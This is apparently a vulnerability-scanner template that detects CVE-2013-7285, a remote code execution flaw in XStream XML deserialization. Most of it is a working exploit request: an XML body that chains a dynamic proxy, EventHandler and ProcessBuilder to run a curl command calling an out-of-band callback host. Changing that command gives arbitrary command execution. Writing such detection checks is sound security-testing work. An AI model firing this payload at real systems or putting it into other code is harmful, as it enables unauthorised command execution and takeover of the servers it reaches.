id: CVE-2013-7285

info:
  name: XStream <1.4.6/1.4.10 - Remote Code Execution
  author: pwnhxl
  severity: critical
  description: |
    Xstream API before 1.4.6 and 1.4.10 is susceptible to remote code execution. If the security framework has not been initialized, an attacker can run arbitrary shell commands by manipulating the processed input stream when unmarshaling XML or any supported format. This can allow an attacker to obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
  reference:
    - http://x-stream.github.io/CVE-2013-7285.html
    - https://x-stream.github.io/CVE-2013-7285.html
    - https://www.mail-archive.com/user@xstream.codehaus.org/msg00607.html
    - https://www.mail-archive.com/user@xstream.codehaus.org/msg00604.html
    - https://nvd.nist.gov/vuln/detail/cve-2013-7285
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2013-7285
    cwe-id: CWE-78
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    epss-score: 0.33561
  tags: cve,cve2013,xstream,deserialization,rce,oast
  metadata:
    max-request: 1

http:
  - raw:
      - |
        POST / HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <contact class='dynamic-proxy'>
          <interface>org.company.model.Contact</interface>
          <handler class='java.beans.EventHandler'>
            <target class='java.lang.ProcessBuilder'>
              <command>
                <string>curl http://{{interactsh-url}} -H 'User-Agent: {{rand_base(6)}}'</string>
              </command>
            </target>
            <action>start</action>
          </handler>
        </contact>

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"

      - type: word
        part: interactsh_request
        words:
          - "User-Agent: {{rand_base(6)}}"

# Enhanced by md on 2023/04/12
